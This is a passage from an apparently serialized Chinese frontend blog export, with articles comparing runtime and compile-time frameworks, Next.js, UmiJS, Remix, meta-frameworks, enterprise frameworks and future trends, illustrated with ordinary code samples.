Vue/Angular/React 都属于这类框架 \n\n![图片|496](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810211529.png)\n\n>  如果定义 Vue 的一个组件模板使用 template: `<div>....</div>` 来指定，必然要`运行时编译`\n\n### 4.3. 纯编译时框架，代表`Svelte`  \n\n![图片|568](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810211619.png)\n\n## 5. 原生 JS 操作 DOM、InnerHTML 与 虚拟 DOM 快慢对比  \n\n  \n可从以下三个方面来度量  \n  \n- 理解成本上\n\t- **原生 JS 操作 DOM > InnerHTML > 虚拟 DOM**  \n- 维护性上\n\t- **原生 JS 操作 DOM 、 InnerHTML < 虚拟 DOM**  \n- 性能上\n\t- 取决于`页面大小`，`页面变更大小`\n\t\t- 是`新建页面` 还是`更新页`面 甚至是`更新策略`等\n\t- 不同场景下有不同结论。 \n\n## 6. 最后  \n\n无论是`命令式`还`是声明式`，或者框架需要设计成`运行时`、`编译时`或`运行时+编译时`，都需要结合 `性能`、`理解成本`、`维护性`上做权衡选择。  \n\n## 7. 参考\n\n- 《Vue.js 设计与实现》\n","5uJ23G12":"\n# 前端框架设计的核心要素\n\n`#前端` `#前端框架`  `#vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 开发体验\n\t- 工具链：开发、调试、构建\n\t- 报错提示\n\t- 开发调试\n- 产物体积\n\t- tree-shaking\n- 多环境下多产物\n- 特定开关，为了，比如 vue 的 组合式 还是 选项式\n\t- 更好性能\n\t- 更小体积\n- 错误处理机制&降级等\n- ts 支持\n\n---\n\n\n> 对于开发一个前端框架来说，有哪些`核心要素`呢？ 如下：\n\n## 2. 开发体验\n\n- **工具链**: \n\t- 开发、调试、构建\n- **报错警告提示，是否能够让开发者立马定位到问题**\n\t- 比如 如何提示 `App.mount('#app')` 中 `#app` 节点 不存在\n- **开发调试是否直观？**\n\t- 比如`const obj = ref()` ，每次都是打印 `obj`的值都需要 `obj.value` ?  \n\t\t- 框架层面肯定需要提供好的 log 方式\n\t\t\t- `DevTools` 提供 `custom formmaters` \n\t\t\t- 框架层面会提供 `initCustomFormatter` 的定义\n\n## 3. 控制框架代码体积\n\n如何做到开发环境下更多提示，而不增加代码体积呢？\n- 需要使用 `roolup 插件` 或者 `webpack 插件` 的 `__DEV__常量`  来做到这一点，生成环境下形成  `dead code` , 在使用打包工具 `tree-shaking` 的能力，进行移除\n\n> [!info]\n`dead code` 即 永远不会执行的代码，如 `if(false)` 或者 `import 后没使用的模块`等\n\n## 4. 良好的 `tree-shaking` 机制\n\n- 上面说的`dead code` 很容易被 `tree-shaking`掉\n\t- 但是`副作用` 呢，因为 `proxy` 能力`只读每个属性`也可能引起`副作用`。\n\t\t- 答案是：`/*#__PURE__*/`   \n\t\t\t- `rollup` 和 `webpack` 、`terser` 都可以识别它 ，它告诉打包工具，`放心 tree-shaking 掉吧` \n\n## 5. 多种环境下的构建产物不一样\n\n比如：\n- `rollup` 下，设置 `format` 为 `iife` 给 `script` 标签直接使用\n- `rollup` 下，设置 `format` 为 `esm` 给 `<script type=\"module\">` 直接使用\n- `rollup` 下，设置 `format` 为 `cjs` 给 nodejs 环境使用 ，为了 `SSR`\n\n另外，如何打包给 `rollup` 或者 `webpack` 工具使用呢 ？\n- 答案是 `esm` , 但又如何 与   `<script type=\"module\">` 区别呢 ？\n- 看 package.json , 如下 `代码` 和 `图片` \n\n```json\n{\n\t\"main\":\"index.js\",\n\t\"module\":\"dist/vue.runtime.esm-bundler.js\",\n}\n```\n\n![|648](https://od-1310531898.cos.ap-beijing.myqcloud.com/202303191018366.png)\n\n## 6. 支持特性开关\n\n  比如 vue3 的 `组合式 API` 和 `选项式 API`， 如果用户确定只需要使用 `组合式 API` ，那么可以通过设置 `__VUE_OPTIONS_API__` 预定于常量来开启或者关闭\n\n## 7. 错误处理机制\n\n比如一个工具库提供一个 `fetch` 方法 ，但使用的方式必须传入回调 `fetch(callback)`，怎么容错呢？三种\n1. 用户自己 `try catch`，但是如果有很多方法，需要每个都 `try catch` 吗\n2. 用户自己实现一个 `handleError` 方法\n3. 工具库提一个 `utils.registerErrorHandler` 静态方法, 用户使用它注册错误处理程序\n\t- 第 3 种，就是 Vue 的处理方式，`app.config.errorHandler`  , 为用户提供更好的框架层面的健壮性\n\n## 8. Typescript 支持\n\n完善 Typescript 支持，**可能比框架本身还要花精力和时间**\n\n## 9. 参考\n\n- 《Vue.js 设计与实现》","49K1JEwh":"\n# Next.js 与 Umi.js\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 框架定位与背景 \n\n### 1.1. Next.js\n\n- 由 Vercel 开发维护\n- 面向全球的 React 应用开发框架\n- 专注于现代 Web 应用开发\n- 与 React 团队紧密合作，常常率先支持最新特性 \n- 强调性能和开发体验\n\n### 1.2. UmiJS\n\n- 蚂蚁集团开发的企业级框架\n- 定位为可扩展的企业级前端应用框架\n- 专注于中国企业级应用开发场景\n- 提供完整的前端工程化解决方案\n\n## 2. 核心特性对比\n\n### 2.1. 路由系统\n\n**Next.js**:\n```javascript\n// app/dashboard/page.tsx\nexport default function Dashboard() {\n  return <div>Dashboard Page</div>\n}\n\n\n// app/blog/[slug]/page.tsx\nexport default function Page({ params }: { params: { slug: string } }) {\n  return <div>My Post: {params.slug}</div>\n}\n```\n\n- ==基于文件系统的约定式路由==\n- **App Router**（新） 和 **Pages Router**（传统）双模式\n- 支持动态路由和嵌套路由\n- 自动路由优化和代码分割 \n\n**UmiJS**: → `.umirc.ts`\n\n\n```javascript\n// .umirc.ts\nexport default {\n  routes: [\n    { path: '/', component: '@/pages/index' },\n    { path: '/blog/:slug', component: '@/pages/blog/[slug]' },\n  ],\n}\n```\n\n- 同时支持配置式路由和约定式路由\n- 更灵活的路由配置能力\n- 内置路由权限管理\n- 支持路由级别的**代码分割和按需加载**\n\n## 3. 开发体验\n\n### 3.1. Next.js 优势\n\n- **零配置**即可开始开发\n- 完善的 TypeScript 支持\n- React Server Components 支持\n- Fast Refresh 热更新\n- 优秀的开发者工具和调试体验\n- Vercel 部署集成 \n\n### 3.2. UmiJS 优势\n\n- 插件化架构，高度可扩展\n- MFSU（Module Federation Speed Up）构建加速\n- 开箱即用的企业级特性\n- 完整的中文文档支持\n- 丰富的脚手架和模板\n- 与 antd 等中国技术栈深度集成\n- 微前端架构支持（`qiankun`） \n\n## 4. 构建和性能优化\n\n### 4.1. Next.js\n\n- Turbopack 构建支持\n- 自动静态优化\n- 增量静态再生成（ISR）\n- 智能打包优化\n- 自动图片和字体优化\n- 内置性能分析工具\n- Edge Runtime 支持\n- 智能打包和代码分割\n\n### 4.2. UmiJS\n\n- 支持 webpack 和 Rspack 构建\n- MFSU（Module Federation Speed Up）技术\n- 内置的性能优化方案\n- 静态资源的智能处理\n- 微前端架构支持（qiankun） \n\n## 5. 服务端渲染（SSR）能力\n\n### 5.1. Next.js\n\n```javascript\n// app/api/data/route.ts\nexport async function GET() {\n  const data = await fetchData()\n  return Response.json(data)\n}\n```\n\n- 原生支持 React Server Components\n- 增量静态再生成（ISR）\n- 流式 SSR\n- 边缘计算支持\n\n### 5.2. UmiJS\n\n```javascript\n// pages/index.tsx\nexport async function getServerSideProps() {\n  const data = await fetchData()\n  return { props: { data } }\n}\n```\n\n- 传统 SSR 支持\n- 预渲染能力\n- 服务端数据预取\n- 动态组件加载\n\n## 6. 生态系统\n\n### 6.1. Next.js\n\n- 庞大的国际开发者社区\n- Vercel 平台优化\n- 丰富的第三方组件和插件\n- 完善的英文文档和教程 \n\n### 6.2. UmiJS\n\n- 蚂蚁金服技术生态\n- antd 组件库默认集成\n- dumi 文档工具\n- 丰富的官方插件体系\n- 完善的中文社区支持\n\n## 7. 最佳使用场景\n\n### 7.1. Next.js 适合：\n\n1. 国际化项目开发\n2. 需要最新 React 特性的项目\n3. 需要极致性能优化的应用\n4. JAMStack 架构的网站\n5. 需要全球部署的应用 \n\n### 7.2. UmiJS 适合：\n\n1. 企业级中后台应用\n2. 需要完整工程化方案的团队\n3. 偏好配置式开发的团队\n4. 需要中文技术支持的团队\n5. 使用蚂蚁技术栈的项目 \n\n## 8. 总结\n\n- 如果你的项目是面向国际市场、需要最新 React 特性，选择 `Next.js`\n- 如果你的项目是企业级中后台、需要完整的中文生态支持，选择 `UmiJS`\n- Next.js 更注重开发体验和性能优化\n- UmiJS 更注重企业级特性和工程化能力\n\n","Si7p1IM4":"\n# UmiJS 与 Remix\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 框架定位 \n\n### 1.1. UmiJS\n\n- 定位：企业级前端应用框架\n- 主要面向：中国企业级市场\n- 技术栈：React + 现代前端工具链\n- 维护方：蚂蚁集团\n\n### 1.2. Remix\n\n- 定位：全栈 Web 框架\n- 主要面向：全球开发者市场\n- 技术栈：React + Web 标准\n- 维护方：Shopify（原 Remix 团队）\n\n## 2. 架构特点\n\n### 2.1. UmiJS\n\n```typescript\n// .umirc.ts\nexport default {\n  routes: [{\n    path: '/',\n    component: '@/pages/index',\n  }],\n  plugins: ['@umijs/plugin-model'],\n}\n```\n\n- 插件化架构\n- 约定式路由 + 配置式路由\n- **前端为主**的开发模式\n- MFSU（Module Federation Speed Up）构建优化\n\n### 2.2. Remix\n\n```typescript\n// app/routes/index.tsx\nimport type { LoaderFunction } from '@remix-run/node';\n\nexport const loader: LoaderFunction = async () => {\n  return json({ data: await getData() });\n};\n\nexport default function Index() {\n  const { data } = useLoaderData();\n  return <div>{data}</div>;\n}\n```\n\n- **基于 Web 标准**构建\n- 嵌套路由架构\n- 全栈开发模式\n- **服务端优先**的数据加载\n\n## 3. 数据处理\n\n### 3.1. UmiJS\n\n```typescript\n// src/models/user.ts\nexport default {\n  state: {\n    user: null\n  },\n  effects: {\n    *fetchUser({ payload }, { call, put }) {\n      const user = yield call(getUserAPI);\n      yield put({ type: 'save', payload: user });\n    }\n  }\n}\n```\n\n- 支持多种数据流方案（dva、@umijs/plugin-model）\n- 前端状态管理为主\n- 支持请求库封装\n- 提供数据 mock 功能\n\n### 3.2. Remix\n\n```typescript\n// app/routes/users.tsx\nexport async function loader({ request }: LoaderArgs) {\n  const users = await db.user.findMany();\n  return json({ users });\n}\n\nexport async function action({ request }: ActionArgs) {\n  const form = await request.formData();\n  return await createUser(form);\n}\n```\n\n- 基于 Web Fetch API\n- 服务端数据加载\n- Form Actions 处理\n- 自动表单验证\n\n## 4. 路由系统\n\n### 4.1. UmiJS\n\n```typescript\n// config/routes.ts\nexport default [\n  { path: '/', component: '@/pages/index' },\n  { \n    path: '/users', \n    component: '@/layouts/UserLayout',\n    routes: [\n      { path: '/users/list', component: '@/pages/users/list' }\n    ]\n  }\n]\n```\n\n- 支持**配置式和约定式路由**\n- 路由级别的代码分割\n- 内置权限路由\n- 支持路由预加载 \n\n### 4.2. Remix\n\n```typescript\n// app/routes/users.$id.tsx\nexport default function UserProfile() {\n  const { user } = useLoaderData<typeof loader>();\n  return <div>{user.name}</div>;\n}\n```\n\n- 文件系统路由\n- 嵌套路由和布局\n- 并行数据加载\n- 资源路由\n\n## 5. 构建和性能\n\n### 5.1. UmiJS\n\n- 支持 webpack 和 Rspack\n- MFSU 构建优化\n- 动态导入优化\n- 预渲染支持\n- 静态资源处理 \n\n### 5.2. Remix\n\n- 基于 esbuild\n- 服务端渲染（SSR）\n- HTTP 缓存优化\n- 渐进式增强\n- 资源预加载\n\n## 6. 开发体验\n\n### 6.1. UmiJS\n\n优势：\n- 完整的开发工具链\n- 丰富的脚手架\n- 中文文档完善\n- 插件生态丰富 [2]\n\n### 6.2. Remix\n\n优势：\n- 简单直观的 API\n- 遵循 Web 标准\n- 出色的错误处理\n- 优秀的类型支持\n\n## 7. 企业特性\n\n### 7.1. UmiJS\n\n- 微前端支持（qiankun）\n- 完整的国际化方案\n- 企业级权限管理\n- 丰富的插件生态 [4]\n\n### 7.2. Remix\n\n- 多租户支持\n- 边缘计算支持\n- 适配多种部署平台\n- 完整的错误边界处理\n\n## 8. 适用场景\n\n### 8.1. UmiJS 适合：\n\n1. 企业级中后台应用\n2. 需要完整工程化方案的团队\n3. 微前端架构项目\n4. 本地化优先的项目 [2]\n\n### 8.2. Remix 适合：\n\n1. 全栈 Web 应用\n2. 需要 SEO 优化的项目\n3. 高性能要求的应用\n4. 需要渐进式增强的项目\n\n## 9. 生态系统\n\n### 9.1. UmiJS\n\n- 蚂蚁金服技术生态\n- antd 组件库集成\n- dumi 文档工具\n- 丰富的官方插件 [3]\n\n### 9.2. Remix\n\n- Shopify 生态\n- 支持多种UI框架\n- 支持多种部署平台\n- 活跃的社区贡献\n\n## 10. 部署选项\n\n### 10.1. UmiJS\n\n- 传统服务器\n- 静态文件托管\n- Docker 容器\n- 云服务平台 [1]\n\n### 10.2. Remix\n\n- Edge Functions\n- Node.js 服务器\n- Serverless 函数\n- 云平台（Vercel、Netlify等）\n\n## 11. 选择建议：\n\n1. 选择 UmiJS 的情况：\n   - 开发企业级中后台系统\n   - 需要完整的中文生态支持\n   - 项目需要微前端架构\n   - 团队主要面向中国市场\n\n2. 选择 Remix 的情况：\n   - 开发全栈 Web 应用\n   - 需要优秀的 SEO 表现\n   - 注重 Web 标准和最佳实践\n   - 需要边缘计算能力\n\n3. 技术栈考虑：\n   - 如果团队熟悉 React 生态，两个框架都是不错的选择\n   - 如果需要服务端渲染和数据加载，Remix 更具优势\n   - 如果需要完整的企业级解决方案，UmiJS 更合适\n\n4. 性能考虑：\n   - UmiJS 在构建性能和开发体验上有优势\n   - Remix 在运行时性能和用户体验上更出色","Iom0MuIb":"\n# 前端元框架\n\n`#前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结  \n\n- 一句话：**最佳实践集合与工程体现**\n- 支持多种渲染方式\n- 开箱即用的能力\n\t- 比如基于文件系统的路由\n\t- ==一键配置==支持各种能力，比如 `ssr:true`\n\t- 内置功能优化：\n\t\t- 代码分割\n\t\t- 图片优化\n\t\t- 对接 CI、CD 以及内部系统等\n\t\t\t- 比如 构建发布系统\n\t\t- 集成内部各种服务\n\t\t\t- 比如 存储服务、cdn\n\t\t- sso 登录、鉴权\n\t\t- 日志监控平台\n- 必要性\n\t- 更高开发者体验要求\n\t- 更高性能要求\n\t- 更高 SEO 要求\n\t- 更高==业务需求复杂度==要求\n- 原则\n\t- 约定大于配置\n\t- 统一的项目结构\n\t- 清晰的最佳实践\n\t- 各类规范\n\n## 2. 什么是元框架（Meta Framework）\n\n元框架是建立在`基础框架`之上的更高级别框架，提供了**一套完整的开发解决方案**。主要特点：\n- 基于现有框架**扩展**（如React、Vue 等）\n- 提供更完整的**项目架构**\n- 内置**多种渲染模式**\n\t- 服务器端渲染 (SSR)\n\t- 静态站点生成 (SSG)\n\t- 客户端渲染 (CSR)\n\t- 增量静态再生成 (ISR)\n- 提供更多**开箱即用**的功能\n\t- 文件系统路由\n\t- API 路由处理\n\t- 自动代码分割\n\t- 图片优化\n\t- 开发环境优化\n\t- SEO支持\n\t- 构建上线\n\t- 对接 CI、CD 工具等等\n\n## 3. 主流元框架举例\n\n### 3.1. 国内： Umi（React/Vue） \n\n蚂蚁\n\n### 3.2. 国内：Modern.js\n\n字节\n\n### 3.3. Next.js（基于 React）\n\n- 由 `Vercel` 开发维护\n- 支持 SSR（服务端渲染）\n- 支持 SSG（静态站点生成）\n- 自动代码分割\n- 文件系统路由\n- API 路由功能\n- 内置图片优化\n\n### 3.4. Nuxt.js（基于Vue）\n\n- Vue.js 的通用框架\n- 自动路由配置\n- 支持 SSR 和 SSG\n- 模块化架构\n- SEO 优化\n- 静态站点生成\n- **服务端中间件**\n\n### 3.5. Remix（基于React）\n\n- `全栈 Web` 框架\n- 嵌套路由\n- 数据加载\n- 错误处理\n- 服务端渲染\n- 优秀的缓存策略\n\n### 3.6. Astro (支持多框架)\n\n- Astro 是一个非常现代化的`静态站点生成器`，特别适合构建以内容为中心的网站。\n- 它的零 JavaScript 默认策略和部分水合特性使得它在性能方面表现出色。\n- 同时，它支持多框架组件的使用，这使得团队可以充分利用现有的技术栈和组件库。\n- 对于需要构建快速、轻量级网站的开发者来说，Astro 是一个非常值得考虑的选择。\n\n### 3.7. SvelteKit (基于 Svelte )\n\n- 官方全栈框架\n- 文件系统路由\n- SSR/SSG 支持\n- API 路由\n- 适配器系统\n\n## 4. 为什么元框架会兴起\n\n### 4.1. 技术需求\n\n- 现代Web应用更**复杂**\n- **SEO** 要求提高\n- **性能**优化需求增加\n- **开发效率**要求提升\n\n### 4.2. 全栈能力\n\n- 服务端API集成\n- **数据库**连接\n- **身份**认证\n- **部署**集成\n\n### 4.3. 解决的问题\n\n- 服务端渲染（SSR）配置复杂\n- 路由管理繁琐\n- 构建优化困难\n- 部署流程复杂\n\n## 5. 元框架的核心优势\n\n> 最佳实践集合与工程体现\n\n### 5.1. 开发体验\n\n- **约定大于配置**\n- **自动化**的工具链\n- 统一的项目结构\n- 清晰的最佳实践\n\n### 5.2. 性能优化\n\n- 自动代码分割\n- 智能预加载\n- 图片自动优化\n- 静态资源处理\n\n### 5.3. 部署便利\n\n- 静态导出\n- 服务端部署\n- **CDN 集成**\n- 自动化部署\n- 边缘计算支持\n\n## 6. 选择建议\n\n### 6.1. 根据项目需求\n\n- 需要SSR/SSG → Next.js/Nuxt.js\n- 全栈应用 → Remix\n- 静态网站 → Astro\n- 文档站点 → VitePress / Docusaurus\n\n### 6.2. 根据技术栈\n\n- React生态 → Next.js/Remix\n- Vue生态 → Nuxt.js\n- 性能优先 → Astro\n\n","yVnr7cg8":"\n# 企业级框架\n\n`#前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 全栈框架 → 最终 `f(state,data)`\n\t- 后端围绕 `数据存取`展开\n\t- 前端围绕 `“UI”展开`\n- 企业级框架\n\t- 在**可靠性、可维护性、安全性**等多个维度都达到**企业级标准**，\n\t- 完善的生态系统和技术支持\n\t- 内置==整个前端研发链路的全套解决方案==\n- 现象：每个大厂都会基于 koa 包装一层 node 框架\n\t- 因为需要 ==内置自己的基础设施==，比如\n\t\t- SSO\n\t\t- 对接日志平台\n\t\t- 对接 serverless 能力\n\t\t- 登录、权限\n\t\t- 埋点\n\t\t- CDN 服务\n\t\t- 各类配置，存储服务等\n- 前端框架体系\n\t- 建立离不开`前端工程化成熟`和`最佳实践的沉淀`。\n\t- 你可以认为框架就是一个整合的方案，提供一个前端`最佳的组合配置`。\n\t- 开发者需要做的就是\n\t\t- ==在这个框架约束下填充自己业务代码==\n\n## 2. React、vue、Angular、koa、express、egg 等\n\nReact 是一个框架吗？ Vue 是一个框架吗？\n- 严格来说不是，它们只是一个 `视图解决方案` \n- 这里面算得上是框架的估计只有 `Angular`\n- 另外 Umi、 Nuxt.js 、Next.js 等也是算\n\nkoa、express、egg 呢？\n- koa、express 不是\n- egg 是\n\n- 后端围绕 `数据存取`展开\n- 前端围绕 `“UI”展开`\n\n## 3. 为何企业级框架\n\n企业级框架不仅仅是一个开发工具，而是**一个完整的解决方案**\n- 它需要在**可靠性、可维护性、安全性**等多个维度都达到**企业级标准**，\n\t- 同时提供完善的生态系统和技术支持，以满足大型企业应用开发的需求\n- 面向企业生产\n- 目的是提高企业的生产力、高效、成熟、约束与限制比较多、性能、稳定、可用、健壮、标准化、生产验证、用例保证、**整个链路环节**。\n- 所以，需要**内置整个前端研发链路的全套解决方案**\n\n列举几个你认为算是**企业级的框架**：\n- umi : 可插拔的企业级 react 应用框架\n- egg ，企业级框架，Nodejs 后端开发全链路\n\t- **Egg.js 为企业级框架和应用而生**。\n- angular，也算是\n- 而其他 React、Koa、没有企业级 ？\n\t- 这也是你会发现各个大厂**都会基于 koa 搞一遍类似于 egg 的东西**\n\t\t- 因为需要 ==内置自己的基础设施==，比如\n\t\t\t- SSO\n\t\t\t- 对接日志平台\n\t\t\t- 对接 serverless 能力\n\t\t\t- 登录、权限\n\t\t\t- 埋点\n\t\t\t- CDN 服务\n\t\t\t- 各类配置，存储服务等\n\n## 4. 企业级前端框架\n\n- 前端框架体系的建立离不开`前端工程化成熟`和`最佳实践的沉淀`。\n- 你可以认为框架就是一个整合的方案，提供一个前端`最佳的组合配置`。\n- 开发者需要做的就是\n\t- **在这个框架约束下填充自己业务代码**。\n\n所以\n- 算得上是**前端框架**我认为有\n\t- Umi、Angular 、 Next.js、Vue-CLI、Create-React-App、Next.js、Nuxt.js 等\n- 后端框架（Nodejs 框架）有：\n\t- Egg.js\n\t- 当然还有很多大厂没有开源的基于 Koa 的 Node.js 框架，\n\t\t- 比如之前在\n\t\t\t- ==贝壳的 Hobber、美团、百度都要类似东西==\n\n## 5. 最后\n\n所以，**元框架才是前端框架**，更多参考 [4. 前端元框架](/post/Iom0MuIb.html)","jwvEE4ZX":"\n# 编译时框架 vs 运行时框架\n\n`#前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 主流框架都是==编译时+运行时框架==，比如 vue、React 等\n\t- 结合==编译时优化==和==运行时灵活性&动态性==\n- 运行时框架\n\t- 运行时进行，组件渲染、状态管理、使用`虚拟 DOM` 进行==差异化更新==\n- 编译时框架：Svelte\n- 选择建议\n\t- 性能敏感 \n\t\t- 可考虑 Svelte\n\t- 静态内容为主 \n\t\t- 可考虑 Svelte\n\n## 2. 定义\n\n- 编译时框架（Compile-time Framework）：\n\t- 在`构建阶段`完成大部分工作\n\t- 将框架代码转换为优化后的**原生 JavaScript**\n\t- 最小化运行时开销\n\t- 代表框架：\n\t\t- Svelte、Solid\n- 运行时框架（Runtime Framework）：\n\t- 在浏览器中需要完整的框架运行时\n\t- 使用`虚拟 DOM` 进行差异化更新\n\t- 运行时进行\n\t\t- 组件渲染\n\t\t- ==状态管理==\n\t- 代表框架：\n\t\t- React、Vue、Angular\n\n## 3. 主流框架对比分析\n\n### 3.1. React（运行时框架）\n\n```javascript\n// React 示例\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return (\n    <div>\n      <p>{count}</p>\n      <button onClick={() => setCount(count + 1)}>+</button>\n    </div>\n  );\n}\n```\n\n\n- 需要完整的 React 运行时\n- 使用虚拟 DOM 进行差异化更新\n- 状态更新触发组件重新渲染\n- 打包后包含框架代码\n\n> 当然也有**编译动作**，比如 JSX 的编译，各类打包动作等等\n\n### 3.2. Svelte（编译时框架）\n\n```javascript\n// Svelte 示例\n<script>\n  let count = 0;\n</script>\n\n<div>\n  <p>{count}</p>\n  <button on:click={() => count++}>+</button>\n</div>\n```\n\n\n- 编译后生成\n\t- **→ 原生 JavaScript**\n- 无虚拟 DOM\n- 精确更新 DOM\n- 最小化运行时代码\n\n### 3.3. Vue（混合模式）\n\n```javascript\n// Vue 示例\n<template>\n  <div>\n    <p>{{ count }}</p>\n    <button @click=\"count++\">+</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      count: 0\n    }\n  }\n}\n</script>\n```\n\n- 包含运行时但相对轻量\n- 使用虚拟 DOM\n- 响应式系统\n- **编译优化模板**\n\t- 静态变量提升\n\t- v-memo\n\t- v-once\n\t- 等等\n\n## 4. 性能对比\n\n### 4.1. 编译时优势\n\n- 更小的包体积\n- 更快的首次加载\n- 更少的内存占用\n- 更直接的 DOM 操作\n\n### 4.2. 运行时优势\n\n- 动态性更强\n- 更灵活的组件复用\n- 更成熟的生态系统\n- 开发工具支持更好\n\n## 5. 构建产物对比（React 与 Svelte）\n\n让我们通过代码示例来看一个**简单计数器**在不同框架下的**构建产物差异**：\n\n```javascript hl:1,13,8,16,4\n// React 构建产物（简化示意）\nimport { useState } from 'react';\n\n// React 运行时代码...\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return React.createElement('div', null,\n    React.createElement('p', null, count),\n    React.createElement('button', { onClick: () => setCount(count + 1) }, '+')\n  );\n}\n\n// Svelte 构建产物（简化示意）\nlet count = 0;\nconst p = document.createElement('p');\nconst button = document.createElement('button');\np.textContent = count;\nbutton.textContent = '+';\nbutton.addEventListener('click', () => {\n    count++;\n    p.textContent = count;\n});\n```\n\n## 6. 使用场景建议\n\n### 6.1. 编译时框架（如 Svelte）适合\n\n- 性能敏感的应用\n- 包体积要求严格\n- **静态内容为主**\n- 小型到中型项目\n\n### 6.2. 运行时框架（如 React）适合\n\n- 大型复杂应用\n- 需要强大生态支持\n- 团队熟悉度高\n- 动态内容为主\n\n## 7. 开发体验对比\n\n### 7.1. 编译时框架\n\n- 更接近原生 JavaScript\n- 更少的模板代码\n- 更直观的状态管理\n- 构建时报错提示\n\n### 7.2. 运行时框架\n\n- 更成熟的开发工具\n- 更丰富的生态系统\n- 更多的社区资源\n- 更好的调试体验\n\n## 8. 未来趋势\n\n- **混合方案**的兴起：\n\t- 结合编译时优化和运行时灵活性\n- 更智能的编译优化选择\n- 更小的运行时\n- 更好的开发体验\n- 更强的类型支持\n\n## 9. 选择建议\n\n1. 如果项目对性能和包体积有**严格要求**，考虑编译时框架\n2. 如果需要大量第三方库支持，选择主流运行时框架\n3. 如果是新项目，可以考虑混合方案\n4. 需要权衡团队学习成本和项目需求\n\n","i3uGF3Sk":"\n# 前端框架现状及未来趋势\n\n`#前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 性能体验方向\n\t- 去 JS 化 ？比如\n\t\t- 岛屿架构\n\t\t- RSC \n\t- 去 DOM 化？直接编译成 JavaScript\n- 更注重编译时优化\n\t- 减少==运行时开销==成为主要方向 \n- 服务器组件和同构渲染\n\t- RSC \n\t- SSR → SSG\n- 元框架兴起：==开箱即用的完整全链路解决方案==\n\t- 比如 next.js 和 nuxt.js\n- 其他\n\t- 整合 Web Assembly \n\t- ==跨框架==\n\t\t- **微前端**深化\n\t- Serverless 架构 、BFF\n\t\t- **云原生开发模式**\n\t- AI 驱动开发\n\t\t- 比如 Vercel 集成了不少 AI 功能\n\t- 开发范式：\n\t\t- ==函数式==开发（Hooks）\n\t- `卷`编译时\n\t\t- 完全编译时框架\n\t- ==增量更新 与 流式更新==\n\t- 跨平台场景考虑\n\t- 新兴场景: \n\t\t- 元宇宙、AR/VR、大模型场景\n\n## 2. 都忙着**去 JS 化** 和 **去 Vdom 化** ？\n\n- 比如岛屿架构 \n\t- 详见 [9. 前端框架的岛屿架构（Island Architecture）](/post/uhf5nUDr.html)\n- 又比如 `vue3.5` 最新的进展\n\n## 3. 当前主流前端框架概况\n\n- React\n- Vue\n- Svelte\n\t- 新兴的编译时框架\n\t- **无虚拟 DOM**，直接编译为原生 JavaScript\n\t- 性能优秀，包体积小\n\n## 4. 未来趋势\n\n### 4.1. 编译时优化\n\n- Svelte 带动的编译时优化趋势\n- 更多框架开始`关注构建时的优化`\n- 减少运行时开销成为主要方向 \n\n### 4.2. 服务器组件和同构渲染\n\n- React Server Components（RSC） 的推广\n- 服务端渲染(SSR)和静态生成(SSG) 的进一步融合\n- 更好的性能和SEO支持 \n- 包括 JAMStack 架构\n\t- [8. JAMstack 架构](/post/beBNemRn.html)\n\n### 4.3. 元框架兴起\n\n- Next.js(React)、Nuxt(Vue)、umi(React) 等成为标配\n- 同时支持 SSR、SSG 等多种渲染模式\n- 开箱即用的完整解决方案\n\n### 4.4. 去 JavaScript 化\n\n其中的典型代表是\n\n- `Islands Architecture` (岛屿架构)\n-  `React Server Component`(RSC, React 服务端组件)\n\n## 5. 选择建议\n\n- 大型企业项目：\n\t- 考虑Angular 或 React\n- 中小型项目：\n\t- Vue.js 是很好的选择\n- 性能敏感项目：\n\t- 可以考虑 Svelte\n- 快速开发：\n\t- Next.js或Nuxt.js等元框架\n- 性能敏感\n\t- Svelte\n\t- Solid\n- 原生 Web Components\n\n## 6. 其他\n\n- Web Assembly 整合\n- 跨框架：\n\t- **微前端**深化\n- Serverless 架构 、BFF\n\t- **云原生开发模式**\n- AI 驱动开发\n\t- 比如 Vercel 集成了不少 AI 功能\n- 开发范式：\n\t- 函数式开发（Hooks）\n- `卷`编译时\n\t- 完全编译时框架\n- 增量更新\n- 流式更新\n- 跨平台场景考虑\n- 新兴场景: \n\t- 元宇宙、AR/VR、大模型场景\n\n## 7. 附：Vercel AI SDK\n\n- 与 Next.js、Svelte 等主流框架的原生集成\n- 提供开箱即用的组件和 hooks\n- 简化 AI 功能的开发流程\n\t- 支持 AI 响应的实时流式传输\n\t- 优化用户体验，实现打字机效果\n\t- 支持多种主流 LLM 模型\n\n```javascript\n// 1. 基础流式对话实现\nimport { OpenAIStream, StreamingTextResponse } from '@vercel/ai';\n\nexport async function POST(req: Request) {\n  const { messages } = await req.json();\n  const response = await OpenAIStream({\n    model: 'gpt-4',\n    messages,\n  });\n  return new StreamingTextResponse(response);\n}\n\n// 2. 使用 React Hooks\nimport { useChat } from 'ai/react';\n\nexport default function Chat() {\n  const { messages, input, handleInputChange, handleSubmit } = useChat();\n  return (\n    <div>\n      {messages.map(m => (\n        <div key={m.id}>{m.content}</div>\n      ))}\n      <form onSubmit={handleSubmit}>\n        <input\n          value={input}\n          onChange={handleInputChange}\n          placeholder=\"Say something...\"\n        />\n      </form>\n    </div>\n  );\n}\n\n```","HiQSPYgK":"\n# 前端框架后面的金主及生态情况\n\n`#前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 框架对比 \n\n| 框架/工具    | 主要支持方           | 特点                                           | 生态系统                              | 商业支持                   | Stars | 典型应用案例                                 | 发布年份 |\n| -------- | --------------- | -------------------------------------------- | --------------------------------- | ---------------------- | ----- | -------------------------------------- | ---- |\n| React    | Meta (Facebook) | • 虚拟DOM<br>• JSX语法<br>• 组件化<br>• 单向数据流       | • 最大的npm生态<br>• 大量UI库<br>• 完善的工具链 | • Meta全职团队<br>• 企业级支持  